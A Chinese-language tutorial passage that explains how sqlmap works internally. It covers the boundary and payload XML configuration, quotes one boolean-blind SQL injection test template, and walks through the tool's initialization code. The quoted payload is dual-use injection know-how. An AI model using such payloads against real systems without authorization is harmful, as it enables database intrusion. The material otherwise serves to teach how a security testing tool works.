<p>看完配置文件之后，我们回忆一下之前学过的内容，在做SQL注入时，都需要经历哪些步骤呢？</p>

<p>我们知道，一般来说SQL注入攻击可以分为三步，首先是寻找注入点，之后要选择闭合参数的位置，最后要根据需求选择合适的payload，来实现我们的注入攻击操作。</p>

<p>sqlmap和手动SQL注入的思想是相似的，程序可以直接从请求的参数中获取到注入点位置的信息，而闭合参数的位置和payload的选择则会因为它们的多样性变得略微复杂，下面就让我们一起来看看与之相关的两个配置文件。</p>

<p>我们先来看sqlmap中闭合参数的配置内容，这里举个例子帮助你来理解什么是闭合参数。以一个典型的SQL注入语句为例：</p>

<pre><code class="language-python hljs">SELECT <span class="hljs-built_in">id</span> FROM users WHERE name = <span class="hljs-string">'$name'</span>;
</code></pre>

<p>想要对其进行注入，就需要将name参数闭合，这在前两节课中有过较深入的探讨。</p>

<p>对于sqlmap而言，data.xml.boundaries.xml就是用于闭合参数的配置文件，通过该文件我们可以确定闭合元素的字符和位置等等信息，了解该文件有助于我们理解sqlmap真正发送的测试payload的格式，关于payload格式这部分的内容我们会在下一讲具体的讲解。</p>

<pre><code class="language-plain">&lt;?xml version="1.0" encoding="UTF-8"?&gt;

&lt;!--
Tag: &lt;boundary&gt;
    How to prepend and append to the test ' &lt;payload&gt;&lt;comment&gt; ' string.

    Sub-tag: &lt;level&gt;
        From which level check for this test.

        Valid values:
            1: Always (&lt;100 requests)
            2: Try a bit harder (100-200 requests)
            3: Good number of requests (200-500 requests)
            4: Extensive test (500-1000 requests)
            5: You have plenty of time (&gt;1000 requests)

    Sub-tag: &lt;clause&gt;
        In which clause the payload can work.

        NOTE: for instance, there are some payload that do not have to be
        tested as soon as it has been identified whether or not the
        injection is within a WHERE clause condition.
......
</code></pre>

<p>而关于payload这一部分，就让我们看一看sqlmap中payload的配置文件夹，<code>data.xml.payloads/</code>。这个文件夹储存有不同注入攻击类型的payload信息。</p>

<p>该文件夹下的每一个文件都与程序中一个重要的结构test息息相关，它是一个payload的基本信息单元，每个test里面包含了一个完整的payload需要的信息， sqlmap发送的攻击载荷就是在此基础上进行加工得出的，如下代码就是这个文件夹下的<code>boolean_blind.xml</code>文件的部分内容，这里我们选取了完整的test结构方便你了解。</p>

<pre><code class="language-python hljs"> &lt;test&gt;

        &lt;title&gt;AND boolean-based blind - WHERE <span class="hljs-keyword">or</span> HAVING clause (MySQL comment)&lt;/title&gt;

        &lt;stype&gt;<span class="hljs-number">1</span>&lt;/stype&gt;

        &lt;level&gt;<span class="hljs-number">3</span>&lt;/level&gt;

        &lt;risk&gt;<span class="hljs-number">1</span>&lt;/risk&gt;

        &lt;clause&gt;<span class="hljs-number">1</span>&lt;/clause&gt;

        &lt;where&gt;<span class="hljs-number">1</span>&lt;/where&gt;

        &lt;vector&gt;AND [INFERENCE]&lt;/vector&gt;

        &lt;request&gt;

            &lt;payload&gt;AND [RANDNUM]=[RANDNUM]&lt;/payload&gt;

            &lt;comment&gt;<span class="hljs-comment">#&lt;/comment&gt;</span>

        &lt;/request&gt;

        &lt;respons e&gt;

            &lt;comparison&gt;AND [RANDNUM]=[RANDNUM1]&lt;/comparison&gt;

        &lt;/response&gt;

        &lt;details&gt;

            &lt;dbms&gt;MySQL&lt;/dbms&gt;

        &lt;/details&gt;

    &lt;/test&gt;
</code></pre>

<p>可以看到它的结构内部定义攻击类型、方式、生效位置、关联数据库等等信息。-
至此，我们大致了解了sqlmap工作的底层依赖。下一步只需要分析和掌握sqlmap的运行过程，日后在使用中我们就可以更加得心应手。</p>

<p>sqlmap作为一个规模较大的工具，在启动过程中首先会执行一些初始化操作，下面就让我们一起学习sqlmap的初始化过程，通过这部分内容你可以明白sqlmap在启动之初做了哪些事情。</p>

<h2 id="初始化过程">初始化过程</h2>

<p>sqlmap的初始化过程包含四个步骤：环境初始化、命令行参数的解析、全局变量的赋值，以及运行环境的检查。我们将结合代码和图片注释，顺着sqlmap代码运行的顺序，详细讲述每一个步骤。下面让我们从环境初始化开始吧。</p>

<p><strong>环境初始化</strong></p>

<p>首先我们会发现，sqlmap的入口文件是sqlmap.py，这个文件的main如下所示：</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">try</span>:
        main()
    <span class="hljs-keyword">except</span> KeyboardInterrupt:
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">except</span> SystemExit:
        <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">except</span>:
        traceback.print_exc()
    <span class="hljs-keyword">finally</span>:
        <span class="hljs-keyword">if</span> threading.active_count() &gt; <span class="hljs-number">1</span>:
            os._exit(<span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">"_exitcode"</span>, <span class="hljs-number">0</span>))
        <span class="hljs-keyword">else</span>:
            sys.exit(<span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">"_exitcode"</span>, <span class="hljs-number">0</span>))
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">__import__</span>(<span class="hljs-string">"lib.controller.controller"</span>)
</code></pre>

<p>根据main函数的名字，我们可以知道，程序的核心逻辑一定被封装在了mian函数里面。因此，我们可以进入到mian函数里查看。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-keyword">try</span>:
        dirtyPatches()
        resolveCrossReferences()
        checkEnvironment()
        setPaths(modulePath())
        banner()
        args = cmdLineParser()
        cmdLineOptions.update(args.__dict__ <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(args, <span class="hljs-string">"__dict__"</span>) <span class="hljs-keyword">else</span> args)
        initOptions(cmdLineOptions)
        <span class="hljs-keyword">if</span> checkPipedInput():
            conf.batch = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">if</span> conf.get(<span class="hljs-string">"api"</span>):
            <span class="hljs-keyword">from</span> lib.utils.api <span class="hljs-keyword">import</span> StdDbOut
            <span class="hljs-keyword">from</span> lib.utils.api <span class="hljs-keyword">import</span> setRestAPILog
            sys.stdout = StdDbOut(conf.taskid, messagetype=<span class="hljs-string">"stdout"</span>)
            sys.stderr = StdDbOut(conf.taskid, messagetype=<span class="hljs-string">"stderr"</span>)
            setRestAPILog()
        conf.showTime = <span class="hljs-literal">True</span>
        dataToStdout(<span class="hljs-string">"[!] legal disclaimer: %s\n\n"</span> % LEGAL_DISCLAIMER, forceOutput=<span class="hljs-literal">True</span>)
        dataToStdout(<span class="hljs-string">"[*] starting @ %s\n\n"</span> % time.strftime(<span class="hljs-string">"%X /%Y-%m-%d/"</span>), forceOutput=<span class="hljs-literal">True</span>)
        init()
</code></pre>

<p>进入到mian函数之后我们就会发现，环境初始化初始化过程的代码就在这里，该过程引入了两个重要数据容器的映射conf和kb。他们都是全局的环境变量，是存储程序运行中间数据和信息数据的容器，其中sqlmap的结果信息、注入信息、控制信息都是通过它们进行读写来完成程序的执行的。这部分内容我们会在下节课展开。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">from</span> lib.core.data <span class="hljs-keyword">import</span> conf
<span class="hljs-keyword">from</span> lib.core.data <span class="hljs-keyword">import</span> kb
</code></pre>

<p>在这里，为了你更好地理解它们，我们先来看看这两个数据结构是什么，这里我们可以找到lib.core.data.py文件进行观察。</p>

<pre><code class="language-python hljs"><span class="hljs-comment"># object to share within function and classes command</span>

<span class="hljs-comment"># line options and settings</span>

conf = AttribDict()





<span class="hljs-comment"># object to share within function and classes results</span>

kb = AttribDict()
</code></pre>

<p>可以发现，这两个数据结构是作者自己封装的函数，封装的主要目的是实现深拷贝（<code>__deepcopy__</code> ）这个魔法函数。通过这种方式，Python内容数据的拷贝操作会被大大优化。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AttribDict</span>(<span class="hljs-title class_ inherited__">dict</span>):
      ......
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__deepcopy__</span>(<span class="hljs-params">self, memo</span>):

        retVal = self.__class__()

        memo[<span class="hljs-built_in">id</span>(self)] = retVal





        <span class="hljs-keyword">for</span> attr <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(self):

            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> attr.startswith(<span class="hljs-string">'_'</span>):

                value = <span class="hljs-built_in">getattr</span>(self, attr)

                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, (types.BuiltinFunctionType, types.FunctionType, types.MethodType)):

                    <span class="hljs-built_in">setattr</span>(retVal, attr, copy.deepcopy(value, memo))





        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> self.items():

            retVal.__setitem__(key, copy.deepcopy(value, memo))





        <span class="hljs-keyword">return</span> retVal
</code></pre>

<p>接下来我们继续观察main函数。</p>

<pre><code class="language-python hljs">        dirtyPatches()  <span class="hljs-comment"># 补丁函数</span>
        resolveCrossReferences()  <span class="hljs-comment"># 消除交叉引用</span>
        checkEnvironment()  <span class="hljs-comment"># 检查环境</span>
        setPaths(modulePath())  <span class="hljs-comment"># 如果使用py2exe 作为file获取程序路径的替代 设置绝对路径</span>
        banner()
</code></pre>

<p>我们可以看到，程序在进入到try语句之后，首先会执行几个函数。</p>

<p>第一个函数是dirtyPatches() ，它是一个补丁函数。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dirtyPatches</span>():
    <span class="hljs-string">"""
    Place for "dirty" Python related patches
    """</span>
    <span class="hljs-comment"># accept overly long result lines (e.g. SQLi results in HTTP header responses)</span>
    _http_client._MAXLINE = <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>
    <span class="hljs-comment"># prevent double chunked encoding in case of sqlmap chunking (Note: Python3 does it automatically if 'Content-length' is missing)</span>
    <span class="hljs-keyword">if</span> six.PY3:
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(_http_client.HTTPConnection, <span class="hljs-string">"__send_output"</span>):
            _http_client.HTTPConnection.__send_output = _http_client.HTTPConnection._send_output
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_send_output</span>(<span class="hljs-params">self, *args, **kwargs</span>):
            <span class="hljs-keyword">if</span> conf.get(<span class="hljs-string">"chunked"</span>) <span class="hljs-keyword">and</span> <span class="hljs-string">"encode_chunked"</span> <span class="hljs-keyword">in</span> kwargs:
                kwargs[<span class="hljs-string">"encode_chunked"</span>] = <span class="hljs-literal">False</span>
            self.__send_output(*args, **kwargs)
        _http_client.HTTPConnection._send_output = _send_output
    <span class="hljs-comment"># add support for inet_pton() on Windows OS</span>
    <span class="hljs-keyword">if</span> IS_WIN:
        <span class="hljs-keyword">from</span> thirdparty.wininetpton <span class="hljs-keyword">import</span> win_inet_pton
    <span class="hljs-comment"># Reference: https://github.com/nodejs/node/issues/12786#issuecomment-298652440</span>
    codecs.register(<span class="hljs-keyword">lambda</span> name: codecs.lookup(<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">if</span> name == <span class="hljs-string">"cp65001"</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>)
    <span class="hljs-comment"># Reference: http://bugs.python.org/issue17849</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(_http_client, <span class="hljs-string">"LineAndFileWrapper"</span>):
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">_</span>(<span class="hljs-params">self, *args</span>):
            <span class="hljs-keyword">return</span> self._readline()
        _http_client.LineAndFileWrapper._readline = _http_client.LineAndFileWrapper.readline
        _http_client.LineAndFileWrapper.readline = _
    <span class="hljs-comment"># to prevent too much "guessing" in case of binary data retrieval</span>
    thirdparty.chardet.universaldetector.MINIMUM_THRESHOLD = <span class="hljs-number">0.90</span>
    match = re.search(<span class="hljs-string">r" --method[= ](\w+)"</span>, <span class="hljs-string">" "</span>.join(sys.argv))
    <span class="hljs-keyword">if</span> match <span class="hljs-keyword">and</span> match.group(<span class="hljs-number">1</span>).upper() != PLACE.POST:
        PLACE.CUSTOM_POST = PLACE.CUSTOM_POST.replace(<span class="hljs-string">"POST"</span>, <span class="hljs-string">"%s (body)"</span> % match.group(<span class="hljs-number">1</span>))
    <span class="hljs-comment"># https://github.com/sqlmapproject/sqlmap/issues/4314</span>
    <span class="hljs-keyword">try</span>:
        os.urandom(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">except</span> NotImplementedError:
        <span class="hljs-keyword">if</span> six.PY3:
            os.urandom = <span class="hljs-keyword">lambda</span> size: <span class="hljs-built_in">bytes</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))
        <span class="hljs-keyword">else</span>:
            os.urandom = <span class="hljs-keyword">lambda</span> size: <span class="hljs-string">""</span>.join(<span class="hljs-built_in">chr</span>(random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(size))
</code></pre>

<p>之所称它为补丁函数呢，是因为这个函数功能，主要用来处理sqlmap的一些历史信息。例如支持Python2升级Python3、支持Windows平台的inet_pton()函数、限制httplib的最大行长度等等。这些操作对sqlmap的实际功能影响并不是特别大，属于保证用户体验和系统设置的正常选项，我们不需要过多关心。</p>

<p>接下来是resolveCrossReferences函数，它的作用是消除交叉引用。我们通过下面这个示例理解下什么是交叉引用。</p>

<pre><code class="language-python hljs">```python
a.py
<span class="hljs-keyword">from</span> b <span class="hljs-keyword">import</span> b_var
a_var = <span class="hljs-number">1</span>
b.py
<span class="hljs-keyword">from</span> a <span class="hljs-keyword">import</span> a_var
b_var = <span class="hljs-number">2</span>
</code></pre>

<pre><code class="hljs language-vbnet">这就是一个交叉引用的示例，文件`a.py`和`b.py`互相引用导致了运行的python解释器报错。为了避免交叉引用引起这样的问题，这里我们选择通过`resolveCrossReferences()`函数来消除交叉引用。
```python
def resolveCrossReferences():
    “””
    Place <span class="hljs-keyword">for</span> cross-reference resolution
    “””
    <span class="hljs-keyword">lib</span>.core.threads.isDigit = isDigit
    <span class="hljs-keyword">lib</span>.core.threads.readInput = readInput
    <span class="hljs-keyword">lib</span>.core.common.getPageTemplate = getPageTemplate
    <span class="hljs-keyword">lib</span>.core.convert.filterNone = filterNone
    <span class="hljs-keyword">lib</span>.core.convert.isListLike = isListLike
    <span class="hljs-keyword">lib</span>.core.convert.shellExec = shellExec
    <span class="hljs-keyword">lib</span>.core.convert.singleTimeWarnMessage = singleTimeWarnMessage
    <span class="hljs-keyword">lib</span>.core.<span class="hljs-keyword">option</span>._pympTempLeakPatch = pympTempLeakPatch
    <span class="hljs-keyword">lib</span>.request.connect.setHTTPHandlers = _setHTTPHandlers
    <span class="hljs-keyword">lib</span>.utils.search.setHTTPHandlers = _setHTTPHandlers
    <span class="hljs-keyword">lib</span>.controller.checks.setVerbosity = setVerbosity
    <span class="hljs-keyword">lib</span>.utils.sqlalchemy.getSafeExString = getSafeExString
    thirdparty.ansistrm.ansistrm.stdoutEncode = stdoutEncode
</code></pre>

<p>sqlmap在消除交叉引用之后，程序会开始运行检查环境的函数checkEnvironment()。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkEnvironment</span>():
    <span class="hljs-keyword">try</span>:
         os.path.isdir(modulePath())
    <span class="hljs-keyword">except</span> UnicodeEncodeError:
        errMsg = “your system does <span class="hljs-keyword">not</span> properly handle non-ASCII paths. “
        errMsg += “Please move the sqlmap’s directory to the other location”
        logger.critical(errMsg)
        <span class="hljs-keyword">raise</span> SystemExit
    <span class="hljs-keyword">if</span> LooseVersion(VERSION) &lt; LooseVersion(“<span class="hljs-number">1.0</span>”):
        errMsg = “your runtime environment (e.g. PYTHONPATH) <span class="hljs-keyword">is</span> “
        errMsg += “broken. Please make sure that you are <span class="hljs-keyword">not</span> running “
        errMsg += “newer versions of sqlmap <span class="hljs-keyword">with</span> runtime scripts <span class="hljs-keyword">for</span> older “
        errMsg += “versions”
        logger.critical(errMsg)
        <span class="hljs-keyword">raise</span> SystemExit
    <span class="hljs-comment"># Patch for pip (import) environment</span>
    <span class="hljs-keyword">if</span> “sqlmap.sqlmap” <span class="hljs-keyword">in</span> sys.modules:
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (“cmdLineOptions”, “conf”, “kb”):
            <span class="hljs-built_in">globals</span>()[_] = <span class="hljs-built_in">getattr</span>(sys.modules[“lib.core.data”], _)
        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (“SqlmapBaseException”, “SqlmapShellQuitException”, “SqlmapSilentQuitException”, “SqlmapUserQuitException”):
            <span class="hljs-built_in">globals</span>()[_] = <span class="hljs-built_in">getattr</span>(sys.modules[“lib.core.exception”], _)
</code></pre>

<p>checkEnvironment函数会对当前的环境进行初步检查，检查的内容包括，存放sqlmap的路径是否包含非ASCII字符，以及sqlmap的版本是否小于1.0。</p>

<p>下一个函数<code>setPaths(modulePath())</code>是用来给项目中的文件夹和文件设置绝对路径的。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">setPaths</span>(<span class="hljs-params">rootPath</span>):
    <span class="hljs-string">"""
    Sets absolute paths for project directories and files
    """</span>
    paths.SQLMAP_ROOT_PATH = rootPath
    <span class="hljs-comment"># sqlmap paths</span>
    paths.SQLMAP_DATA_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="hljs-string">"data"</span>)
    paths.SQLMAP_EXTRAS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="hljs-string">"extra"</span>)
    paths.SQLMAP_SETTINGS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="hljs-string">"lib"</span>, <span class="hljs-string">"core"</span>, <span class="hljs-string">"settings.py"</span>)
    paths.SQLMAP_TAMPER_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, <span class="hljs-string">"tamper"</span>)
    paths.SQLMAP_PROCS_PATH = os.path.join(paths.SQLMAP_DATA_PATH, <span class="hljs-string">"procs"</span>)
    paths.SQLMAP_SHELL_PATH = os.path.join(paths.SQLMAP_DATA_PATH, <span class="hljs-string">"shell"</span>)
    paths.SQLMAP_TXT_PATH = os.path.join(paths.SQLMAP_DATA_PATH, <span class="hljs-string">"txt"</span>)
    paths.SQLMAP_UDF_PATH = os.path.join(paths.SQLMAP_DATA_PATH, <span class="hljs-string">"udf"</span>)
    paths.SQLMAP_XML_PATH = os.path.join(paths.SQLMAP_DATA_PATH, <span class="hljs-string">"xml"</span>)
    paths.SQLMAP_XML_BANNER_PATH = os.path.join(paths.SQLMAP_XML_PATH, <span class="hljs-string">"banner"</span>)
    paths.SQLMAP_XML_PAYLOADS_PATH = os.path.join(paths.SQLMAP_XML_PATH, <span class="hljs-string">"payloads"</span>)
    <span class="hljs-comment"># sqlmap files</span>
    paths.COMMON_COLUMNS = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"common-columns.txt"</span>)
    paths.COMMON_FILES = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"common-files.txt"</span>)
    paths.COMMON_TABLES = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"common-tables.txt"</span>)
    paths.COMMON_OUTPUTS = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">'common-outputs.txt'</span>)
    paths.SQL_KEYWORDS = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"keywords.txt"</span>)
    paths.SMALL_DICT = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"smalldict.txt"</span>)
    paths.USER_AGENTS = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"user-agents.txt"</span>)
    paths.WORDLIST = os.path.join(paths.SQLMAP_TXT_PATH, <span class="hljs-string">"wordlist.tx_"</span>)
    paths.ERRORS_XML = os.path.join(paths.SQLMAP_XML_PATH, <span class="hljs-string">"errors.xml"</span>)
    paths.BOUNDARIES_XML = os.path.join(paths.SQLMAP_XML_PATH, <span class="hljs-string">"boundaries.xml"</span>)
    paths.QUERIES_XML = os.path.join(paths.SQLMAP_XML_PATH, <span class="hljs-string">"queries.xml"</span>)
    paths.GENERIC_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, <span class="hljs-string">"generic.xml"</span>)
    paths.MSSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, <span class="hljs-string">"mssql.xml"</span>)
    paths.MYSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, <span class="hljs-string">"mysql.xml"</span>)
    paths.ORACLE_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, <span class="hljs-string">"oracle.xml"</span>)
    paths.PGSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, <span class="hljs-string">"postgresql.xml"</span>)
    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> paths.values():
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(path.endswith(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">".txt"</span>, <span class="hljs-string">".xml"</span>, <span class="hljs-string">".tx_"</span>)):
            checkFile(path)
    <span class="hljs-keyword">if</span> IS_WIN:
        <span class="hljs-comment"># Reference: https://pureinfotech.com/list-environment-variables-windows-10/</span>
        <span class="hljs-keyword">if</span> os.getenv(<span class="hljs-string">"LOCALAPPDATA"</span>):
            paths.SQLMAP_HOME_PATH = os.path.expandvars(<span class="hljs-string">"%LOCALAPPDATA%\\sqlmap"</span>)
        <span class="hljs-keyword">elif</span> os.getenv(<span class="hljs-string">"USERPROFILE"</span>):
            paths.SQLMAP_HOME_PATH = os.path.expandvars(<span class="hljs-string">"%USERPROFILE%\\Local Settings\\sqlmap"</span>)
        <span class="hljs-keyword">else</span>:
            paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(<span class="hljs-string">"~"</span>)), <span class="hljs-string">"sqlmap"</span>)
    <span class="hljs-keyword">else</span>:
        paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(<span class="hljs-string">"~"</span>)), <span class="hljs-string">".sqlmap"</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isdir(paths.SQLMAP_HOME_PATH):
            <span class="hljs-keyword">if</span> <span class="hljs-string">"XDG_DATA_HOME"</span> <span class="hljs-keyword">in</span> os.environ:
                paths.SQLMAP_HOME_PATH = os.path.join(os.environ[<span class="hljs-string">"XDG_DATA_HOME"</span>], <span class="hljs-string">"sqlmap"</span>)
            <span class="hljs-keyword">else</span>:
                paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(<span class="hljs-string">"~"</span>)), <span class="hljs-string">".local"</span>, <span class="hljs-string">"share"</span>, <span class="hljs-string">"sqlmap"</span>)
    paths.SQLMAP_OUTPUT_PATH = getUnicode(paths.get(<span class="hljs-string">"SQLMAP_OUTPUT_PATH"</span>, os.path.join(paths.SQLMAP_HOME_PATH, <span class="hljs-string">"output"</span>)), encoding=sys.getfilesystemencoding() <span class="hljs-keyword">or</span> UNICODE_ENCODING)
    paths.SQLMAP_DUMP_PATH = os.path.join(paths.SQLMAP_OUTPUT_PATH, <span class="hljs-string">"%s"</span>, <span class="hljs-string">"dump"</span>)
    paths.SQLMAP_FILES_PATH = os.path.join(paths.SQLMAP_OUTPUT_PATH, <span class="hljs-string">"%s"</span>, <span class="hljs-string">"files"</span>)
    <span class="hljs-comment"># History files</span>
    paths.SQLMAP_HISTORY_PATH = getUnicode(os.path.join(paths.SQLMAP_HOME_PATH, <span class="hljs-string">"history"</span>), encoding=sys.getfilesystemencoding() <span class="hljs-keyword">or</span> UNICODE_ENCODING)
    paths.API_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, <span class="hljs-string">"api.hst"</span>)
    paths.OS_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, <span class="hljs-string">"os.hst"</span>)
    paths.SQL_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, <span class="hljs-string">"sql.hst"</span>)
    paths.SQLMAP_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, <span class="hljs-string">"sqlmap.hst"</span>)
    paths.GITHUB_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, <span class="hljs-string">"github.hst"</span>)
</code></pre>

<p>设置完绝对路径后我们可以看到，sqlmap运行了一个banner函数，它对于sqlmap的运行没有实际的作用，但是作者可以通过banner函数绘制一幅字符画，是不是很酷！</p>

<p><img src="assets/ffc5dd6318d7422bac514b844c795142.jpg" alt="图片"></p>

<p>下方是banner函数的代码，你在构建自己工具的时候也可以考虑引入这种有趣的小函数，为你的工具增添个性化色彩，让它看起来又酷又实用。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">banner</span>():
    <span class="hljs-string">"""
    This function prints sqlmap banner with its version
    """</span>
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">"--version"</span>, <span class="hljs-string">"--api"</span>)) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> conf.get(<span class="hljs-string">"disableBanner"</span>):
        result = BANNER
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> IS_TTY <span class="hljs-keyword">or</span> <span class="hljs-built_in">any</span>(_ <span class="hljs-keyword">in</span> sys.argv <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (<span class="hljs-string">"--disable-coloring"</span>, <span class="hljs-string">"--disable-colouring"</span>)):
            result = clearColors(result)
        <span class="hljs-keyword">elif</span> IS_WIN:
            coloramainit()
        dataToStdout(result, forceOutput=<span class="hljs-literal">True</span>)
</code></pre>

<p><strong>命令行参数解析</strong></p>

<p>经过上面的函数执行之后，基本环境已经配置好了，程序将开始处理用户的输入，包括有命令行参数以及配置的文件参数。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-string">"""
    Main function of sqlmap when running from command line.
    """</span>
    <span class="hljs-keyword">try</span>:
        dirtyPatches()
        resolveCrossReferences()
        checkEnvironment()
        setPaths(modulePath())
        banner()
        <span class="hljs-comment"># Store original command line options for possible later restoration</span>
        args = cmdLineParser()
        cmdLineOptions.update(args.__dict__ <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(args, <span class="hljs-string">"__dict__"</span>) <span class="hljs-keyword">else</span> args)
        initOptions(cmdLineOptions)
</code></pre>

<p><strong>全局变量赋值与环境检查</strong></p>

<p>在接收用户的输入参数之后，程序开始进入init方法，这个方法是一个重要的前期配置方法，里面包含大量的配置操作，这些操作我们可以进入函数中观察。</p>

<pre><code class="language-python hljs"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():
    _useWizardInterface() <span class="hljs-comment"># 启动引导模式</span>
    setVerbosity() <span class="hljs-comment"># 设置默认的日志输出详细度</span>
    _saveConfig()  <span class="hljs-comment"># 保存当前扫描的配置</span>
    _setRequestFromFile() <span class="hljs-comment"># 解析 request file 的文件内容</span>
    _cleanupOptions() <span class="hljs-comment"># 为 conf 中的参数赋初值</span>
    _cleanupEnvironment() 
    _purge() <span class="hljs-comment"># 清空 sqlmap 相关信息</span>
    _checkDependencies() <span class="hljs-comment"># 检查是否缺失依赖</span>
    _createHomeDirectories() <span class="hljs-comment"># 创建 output、history 目录</span>
    _createTemporaryDirectory() <span class="hljs-comment"># 创建临时目录</span>
    _basicOptionValidation() <span class="hljs-comment"># 验证部分参数值是否符合预期</span>
    _setProxyList() <span class="hljs-comment"># 解析 proxy file 的文件内容</span>
    _setTorProxySettings() <span class="hljs-comment"># 设置 tor 代理</span>
    _setDNSServer() <span class="hljs-comment"># 创建 DNS 服务器</span>
    _adjustLoggingFormatter() <span class="hljs-comment"># 初始化日志格式化工具</span>
    _setMultipleTargets() <span class="hljs-comment"># 解析 burp log 的文件内容</span>
    _listTamperingFunctions() <span class="hljs-comment"># 输出 tamper 的详细信息</span>
    _setTamperingFunctions() <span class="hljs-comment"># 设置后续要调用的 tamper</span>
    _setPreprocessFunctions() <span class="hljs-comment"># 设置处理请求的函数</span>
    _setPostprocessFunctions() <span class="hljs-comment"># 设置处理响应的函数</span>
    _setTrafficOutputFP() <span class="hljs-comment"># 创建 trafficFile 并获取文件句柄</span>
    _setupHTTPCollector() <span class="hljs-comment"># 创建 HAR 文件</span>
    _setHttpChunked() <span class="hljs-comment"># 设置 chunked </span>
    _checkWebSocket() <span class="hljs-comment"># 检查 websocket 环境是否正常</span>

    parseTargetDirect() <span class="hljs-comment"># 解析数据库链接</span>

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>((conf.url, conf.logFile, conf.bulkFile, conf.requestFile, conf.googleDork, conf.stdinPipe)):
        _setHostname() <span class="hljs-comment"># 设置 conf 中的 hostname</span>
        _setHTTPTimeout() <span class="hljs-comment"># 设置请求最大超时时间</span>
        _setHTTPExtraHeaders() <span class="hljs-comment"># 设置请求的 headers</span>
        _setHTTPCookies() <span class="hljs-comment"># 设置请求的 cookies</span>
        _setHTTPReferer() <span class="hljs-comment"># 设置请求的 referer</span>
        _setHTTPHost() <span class="hljs-comment"># 设置请求的 host</span>
        _setHTTPUserAgent() <span class="hljs-comment"># 设置请求的 UA</span>
